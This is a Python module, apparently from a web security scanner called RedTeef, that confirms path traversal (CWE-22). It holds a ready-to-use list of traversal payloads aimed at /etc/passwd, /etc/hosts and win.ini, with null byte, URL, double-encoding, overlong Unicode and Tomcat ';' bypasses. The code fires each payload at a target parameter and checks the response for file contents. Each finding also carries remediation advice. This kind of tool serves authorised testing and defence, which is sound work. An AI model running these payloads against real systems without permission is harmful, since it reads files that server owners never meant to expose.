"""
RedTeef — Path traversal confirmation.

Read known files (/etc/passwd, win.ini), null byte bypass, encoding
variants, and double-encoding to confirm path traversal.

CWE-22: Improper Limitation of a Pathname to a Restricted Directory
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger("krumpa.redteef.path_traversal_confirmer")


@dataclass
class TraversalPayload:
    """A single path traversal payload with expected canary."""
    label: str
    payload: str
    canary: re.Pattern[str]
    os_hint: str  # "linux", "windows", "any"


# Known file canary patterns
_ETC_PASSWD = re.compile(r"root:[x*]:0:0:", re.IGNORECASE)
_WIN_INI = re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.IGNORECASE)
_ETC_HOSTS = re.compile(r"(127\.0\.0\.1|::1)\s+localhost", re.IGNORECASE)

# Path traversal payloads — organised by encoding technique
_PAYLOADS: List[TraversalPayload] = [
    # Basic traversal — Linux
    TraversalPayload("Basic ../etc/passwd", "../../../../../../etc/passwd", _ETC_PASSWD, "linux"),
    TraversalPayload("Absolute /etc/passwd", "/etc/passwd", _ETC_PASSWD, "linux"),
    TraversalPayload("../etc/hosts", "../../../../../../etc/hosts", _ETC_HOSTS, "linux"),

    # Basic traversal — Windows
    TraversalPayload("Basic ..\\win.ini", "..\\..\\..\\..\\..\\..\\windows\\win.ini", _WIN_INI, "windows"),
    TraversalPayload("Forward-slash win.ini", "../../../../../../windows/win.ini", _WIN_INI, "windows"),
    TraversalPayload("Absolute C:\\win.ini", "C:\\windows\\win.ini", _WIN_INI, "windows"),

    # Null byte truncation (PHP < 5.3.4)
    TraversalPayload("Null byte Linux", "../../../../../../etc/passwd%00.png", _ETC_PASSWD, "linux"),
    TraversalPayload("Null byte Windows", "..\\..\\..\\..\\windows\\win.ini%00.jpg", _WIN_INI, "windows"),

    # URL encoding
    TraversalPayload("URL-encoded ../", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", _ETC_PASSWD, "linux"),
    TraversalPayload("URL-encoded ..\\", "..%5c..%5c..%5c..%5cwindows%5cwin.ini", _WIN_INI, "windows"),

    # Double URL encoding
    TraversalPayload("Double-encoded ../", "..%252f..%252f..%252f..%252fetc%252fpasswd", _ETC_PASSWD, "linux"),
    TraversalPayload("Double-encoded ..\\", "..%255c..%255c..%255cwindows%255cwin.ini", _WIN_INI, "windows"),

    # Unicode / overlong encoding
    TraversalPayload("Unicode /", "..%c0%af..%c0%afetc%c0%afpasswd", _ETC_PASSWD, "linux"),
    TraversalPayload("Unicode \\", "..%c1%1c..%c1%1cwindows%c1%1cwin.ini", _WIN_INI, "windows"),

    # Mixed separators
    TraversalPayload("Mixed separators", "..\\../..\\../etc/passwd", _ETC_PASSWD, "linux"),

    # Dot stripping bypass
    TraversalPayload("....// bypass", "....//....//....//....//etc/passwd", _ETC_PASSWD, "linux"),
    TraversalPayload("..;/ bypass (Tomcat)", "..;/..;/..;/..;/etc/passwd", _ETC_PASSWD, "linux"),

    # Path normalization tricks
    TraversalPayload("Trailing dot", "../../../../../../etc/passwd.", _ETC_PASSWD, "linux"),
    TraversalPayload("Trailing space (Windows)", "..\\..\\..\\windows\\win.ini ", _WIN_INI, "windows"),
]


class PathTraversalConfirmer:
    """
    Confirm path traversal by:
      1. Injecting traversal payloads into identified parameters
      2. Looking for known file canary patterns in responses
      3. Testing encoding bypass variants
      4. Separate Linux/Windows payload sets
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    async def confirm(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Attempt to confirm path traversal on the target.

        Args:
            target: The target endpoint.
            inject_field: The parameter name to inject into.

        Returns:
            List of confirmed findings.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            for payload_spec in _PAYLOADS:
                result = await self._try_payload(
                    client, target, inject_field, payload_spec,
                )
                if result:
                    findings.append(result)
                    break  # one confirmed finding is enough
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    async def _try_payload(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
        payload_spec: TraversalPayload,
    ) -> Optional[Finding]:
        """Try a single traversal payload and check for canary."""
        method = target.method.upper() if target.method else "GET"

        try:
            if method == "GET":
                params = {inject_field or "file": payload_spec.payload}
                resp = await client.request("GET", target.url, params=params)
            else:
                body = {inject_field or "file": payload_spec.payload}
                resp = await client.request(method, target.url, json_body=body)

            if resp.status_code in (200, 201) and payload_spec.canary.search(resp.text):
                return Finding(
                    title=f"[CONFIRMED] Path traversal on {target.url}",
                    description=(
                        f"Path traversal confirmed using {payload_spec.label}. "
                        f"The server returned file contents matching the expected "
                        f"canary pattern for {payload_spec.os_hint} systems."
                    ),
                    severity=Severity.CRITICAL,
                    target=target,
                    evidence=(
                        f"Payload: {payload_spec.label}\n"
                        f"Field: {inject_field or 'file'}\n"
                        f"OS: {payload_spec.os_hint}\n"
                        f"Status: {resp.status_code}\n"
                        f"Canary match: {payload_spec.canary.pattern}\n"
                        f"Response snippet: {resp.text[:300]}"
                    ),
                    remediation=(
                        "Validate and sanitize file paths. Use an allowlist of "
                        "permitted files. Resolve paths with realpath() and verify "
                        "they stay within the intended directory. Never pass "
                        "user input directly to filesystem operations."
                    ),
                    cwe=22,
                    tags=["confirmed", "path-traversal", "redteef"],
                )
        except (httpx.HTTPError, OSError, ValueError):
            pass

        return None
